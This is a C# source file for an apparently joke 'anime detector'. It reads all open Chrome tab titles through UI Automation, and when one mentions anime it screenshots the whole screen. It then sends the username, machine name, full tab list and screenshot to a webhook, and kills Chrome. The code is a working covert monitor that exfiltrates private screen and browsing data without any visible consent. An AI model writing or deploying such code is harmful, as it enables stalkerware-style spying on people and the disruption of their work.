using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Windows.Automation;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using System.Drawing;

namespace Anime_Chrome_Crasher
{
    public class FindWindows
    {
        public static DateTime startTime = DateTime.Now;

        public static bool GetChrome()
        {
            Process[] getchrome = Process.GetProcessesByName("chrome");
            return (getchrome.Length <= 0) ? false : true;
        }

        public static bool CheckTabs()
        {
            Process[] Chrome = Process.GetProcessesByName("chrome");
            foreach (Process proc in Chrome)
            {
                if (proc.MainWindowHandle == IntPtr.Zero)
                {
                    continue;
                }
                AutomationElement root = AutomationElement.FromHandle(proc.MainWindowHandle);
                Condition condNewTab = new PropertyCondition(AutomationElement.NameProperty, "New Tab");
                AutomationElement elmNewTab = root.FindFirst(TreeScope.Descendants, condNewTab);
                TreeWalker treewalker = TreeWalker.ControlViewWalker;
                try
                {
                    AutomationElement elmTabStrip = treewalker.GetParent(elmNewTab);
                    Condition condTabItem = new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.TabItem);
                    Regex rx = new Regex("[aA]nime");
                    foreach (AutomationElement tabitem in elmTabStrip.FindAll(TreeScope.Children, condTabItem))
                    {
                        if (rx.IsMatch(tabitem.Current.Name))
                        {
                            string tabsOpen = "Tabs open at time of incident : ";
                            foreach (AutomationElement tab in elmTabStrip.FindAll(TreeScope.Children, condTabItem)) {
                                tabsOpen += "| " + tab.Current.Name + " |";
                            }
                            sendDetectionMessage(tabsOpen);
                            killWindow("chrome");
                            return true;
                        }
                    }
                }
                catch (ArgumentNullException)
                {
                    return false;
                }
            }
            return false;
        }

        public static void killWindow(string windowname)
        {
            foreach (var process in Process.GetProcessesByName(windowname))
            {
                try { process.Kill(); } catch (Exception) { }
            }
        }

        public static void sendDetectionMessage(string tabs)
        {
            screenShot();
            TimeSpan timeElapsed = DateTime.Now - startTime;
            WeebHook.SendMessage("WARNING WEEB DETECTED AT " + DateTime.Now.ToString());
            string timeDiff = "After approximately " + timeElapsed.Hours + " hours " + timeElapsed.Minutes + " minutes and "
                + timeElapsed.Seconds + " seconds from the program starting, anime was detected.";
            WeebHook.SendMessage(timeDiff);
            WeebHook.SendMessage("The user " + Environment.UserName + " on the machine " + Environment.MachineName
                + " has been detected looking at anime.");
            WeebHook.SendMessage(tabs);
            WeebHook.SendImage();
        }

        public static void screenShot()
        {
            int resHeight = Screen.PrimaryScreen.Bounds.Height;
            int resWidth = Screen.PrimaryScreen.Bounds.Width;
            Bitmap bmpScreenshot = new Bitmap(resWidth, resHeight);
            Size resSize = new Size(resWidth, resHeight);
            using (var g = Graphics.FromImage(bmpScreenshot))
            {
                g.CopyFromScreen(0, 0, 0, 0, resSize);
            }
            bmpScreenshot.Save("Screenshot.png", System.Drawing.Imaging.ImageFormat.Png);
            bmpScreenshot.Dispose();
        }
    }

}